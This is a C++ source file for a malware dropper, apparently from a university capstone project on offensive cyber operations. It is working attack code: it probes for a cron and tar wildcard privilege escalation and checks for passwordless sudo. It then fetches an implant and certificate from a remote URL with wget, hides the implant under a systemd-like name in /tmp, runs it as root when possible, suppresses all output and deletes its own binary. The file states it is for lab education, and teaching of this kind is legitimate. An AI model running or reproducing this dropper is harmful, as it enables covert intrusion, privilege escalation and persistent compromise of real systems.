/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Beachhead - Initial Access Stage (Stealth-Enhanced)
 *
 * This version downloads the C++ implant binary and its TLS certificate,
 * attempts privilege escalation via tar wildcard injection, and then
 * executes the implant with sudo (if possible) or as the current user.
 *
 * For educational use in controlled lab environment only.
 */

#include <cstdlib>
#include <string>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstring>

#include "privesc_check.h"
#include "privesc.h"

// ----------------------------------------------------------------------
// Minimal logging (only when DEBUG is defined)
// ----------------------------------------------------------------------
static void log_status(const char* msg) {
#ifdef DEBUG
    size_t len = 0;
    while (msg[len]) len++;
    syscall(SYS_write, 2, msg, len);  // stderr
    syscall(SYS_write, 2, "\n", 1);
#else
    (void)msg;
#endif
}

// ----------------------------------------------------------------------
// Check if current user can run sudo without a password
// ----------------------------------------------------------------------
static bool can_sudo_nopasswd() {
    pid_t pid = syscall(SYS_fork);
    if (pid < 0) return false;

    if (pid == 0) {
        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
        if (devnull >= 0) {
            syscall(SYS_dup2, devnull, 1);
            syscall(SYS_dup2, devnull, 2);
            syscall(SYS_close, devnull);
        }
        const char* argv[] = { "sudo", "-n", "true", nullptr };
        syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
        syscall(SYS_exit, 1);
    }

    int status;
    syscall(SYS_wait4, pid, &status, 0, nullptr);
    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
}

// ----------------------------------------------------------------------
// Download a file using wget (quiet, no output)
// ----------------------------------------------------------------------
static bool download_file(const char* url, const char* dest) {
    pid_t pid = syscall(SYS_fork);
    if (pid < 0) return false;

    if (pid == 0) {
        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
        if (devnull >= 0) {
            syscall(SYS_dup2, devnull, 1);
            syscall(SYS_dup2, devnull, 2);
            syscall(SYS_close, devnull);
        }
        const char* argv[] = { "wget", "-q", url, "-O", dest, nullptr };
        syscall(SYS_execve, "/usr/bin/wget", argv, nullptr);
        syscall(SYS_exit, 1);
    }

    int status;
    syscall(SYS_wait4, pid, &status, 0, nullptr);
    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
}

// ----------------------------------------------------------------------
// Main
// ----------------------------------------------------------------------
int main() {
    log_status("[*] Stage 1: Checking privilege escalation conditions...");

    PrivEscConditions cond = check_privesc_viability();

#ifdef DEBUG
    // ... (debug output identical to previous version) ...
#endif

    bool should_escalate = cond.backups_dir_writable &&
                           cond.tar_available &&
                           cond.cron_running &&
                           cond.current_uid != 0;

    if (should_escalate && !can_sudo_nopasswd()) {
        log_status("[*] Stage 2: Attempting privilege escalation...");
        if (execute_tar_privesc() == 0) {
            log_status("[+] Privilege escalation staged. Waiting for cron...");
            for (int i = 0; i < 15; i++) {
                struct timespec ts = {5, 0};
                syscall(SYS_nanosleep, &ts, nullptr);
                if (can_sudo_nopasswd()) {
                    log_status("[+] Successfully gained sudo privileges!");
                    break;
                }
            }
        } else {
            log_status("[!] Privilege escalation setup failed");
        }
    } else if (cond.current_uid == 0) {
        log_status("[+] Already running as root");
    } else if (can_sudo_nopasswd()) {
        log_status("[+] Already have sudo access");
    } else {
        log_status("[!] Privilege escalation conditions not met, proceeding anyway");
    }

    log_status("[*] Stage 3: Downloading implant and certificate...");

    const char* implant_url = URL;
    std::string cert_url_str = URL;
    size_t last_slash = cert_url_str.rfind('/');
    if (last_slash != std::string::npos)
        cert_url_str = cert_url_str.substr(0, last_slash + 1) + "cert.pem";
    else
        cert_url_str = "cert.pem";
    const char* cert_url = cert_url_str.c_str();

    const char* implant_path = "/tmp/systemd-private-update";
    const char* cert_path = "/tmp/index.html";

    if (!download_file(implant_url, implant_path)) {
        log_status("[!] Failed to download implant");
        return 1;
    }

    if (!download_file(cert_url, cert_path)) {
        log_status("[!] Failed to download certificate (continuing anyway)");
    }

    syscall(SYS_chmod, implant_path, 0755);
    log_status("[+] Implant and certificate downloaded");

    log_status("[*] Stage 4: Executing implant...");

    pid_t child_pid = syscall(SYS_fork);
    if (child_pid < 0) {
        log_status("[!] Fork failed");
        return 1;
    }

    if (child_pid == 0) {
        int devnull = syscall(SYS_open, "/dev/null", O_WRONLY);
        if (devnull >= 0) {
            syscall(SYS_dup2, devnull, 1);
            syscall(SYS_dup2, devnull, 2);
            syscall(SYS_close, devnull);
        }

        if (can_sudo_nopasswd()) {
            const char* argv[] = { "sudo", "-n", implant_path, nullptr };
            syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
        } else {
            const char* argv[] = { implant_path, nullptr };
            syscall(SYS_execve, implant_path, argv, nullptr);
        }
        syscall(SYS_exit, 1);
    }

    log_status("[+] Implant launched");

#ifndef DEBUG
    syscall(SYS_unlink, "/proc/self/exe");
#endif

    return 0;
}
